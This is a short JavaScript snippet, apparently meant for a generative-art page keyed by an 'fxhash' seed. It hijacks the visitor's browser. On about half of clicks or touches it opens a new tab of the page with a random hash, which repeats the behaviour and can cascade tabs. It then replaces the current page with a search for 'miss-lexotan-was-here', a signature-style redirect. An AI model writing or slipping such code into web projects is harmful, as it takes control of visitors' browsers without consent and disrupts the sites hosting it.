const randFxhash = () =>
  "oo" +
  Array(49)
    .fill(0)
    .map((_) => alphabet[(Math.random() * alphabet.length) | 0])
    .join("")

const missLexotan = () => {
  if (Math.random() < 0.5) return

  const url = new URL(window.location.href)
  const params = new URLSearchParams(url.search)
  params.set("fxhash", randFxhash())

  const link = document.createElement("a")
  link.href =
    window.location.origin +
    window.location.pathname +
    "?test=ok&" +
    params.toString()
  link.target = "_blank"
  link.click()
  link.delete

  setTimeout(() => {
    window.location.replace(
      "https://www.ecosia.org/news?q=miss-lexotan-was-here"
    )
  }, 100)
}

window.addEventListener("click", missLexotan)
window.addEventListener("touch", missLexotan)
